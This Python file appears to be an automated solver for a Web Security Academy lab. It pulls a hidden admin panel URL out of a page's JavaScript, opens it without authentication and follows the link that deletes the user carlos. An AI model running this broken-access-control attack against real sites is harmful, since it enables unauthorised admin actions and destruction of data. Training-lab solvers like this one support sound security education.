from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import re


def solve_lab(session, *args):
    # Extract and visit admin URL
    logger.info(
        f'Extracting admin URL from the JavaScript included in "{session.url}"...'
    )
    resp = session.get_path("/")
    if resp.status_code != 200:
        logger.failure(f"Unable to visit URL.")
        return

    match = re.search(r"adminPanelTag.setAttribute\('href', '(.*)'\);", resp.text)
    if match is None:
        logger.failure("Unable to find administrative URL.")
        return
    else:
        url = urljoin(session.url, match.group(1))
        logger.success(f"Found URL: {url}")

    logger.info(f'Visiting "{url}"...')
    resp = session.get(url)
    if resp.status_code != 200:
        logger.failure(f"Unable to visit URL.")
        return
    else:
        logger.success("GET request came back with a successful response.")

    # Delete user carlos
    logger.info("Using the response to find URL to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "lxml")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))
    if tag is None:
        logger.failure("Unable to find URL.")
        return
    else:
        url = urljoin(url, tag.get("href"))
        logger.success(f"Found URL: {url}")

    logger.info("Visiting URL to delete the user carlos...")
    resp = session.get(url)
    if resp.status_code != 200:
        logger.failure(f"GET request unsuccessful.")
    else:
        logger.success("Success.")
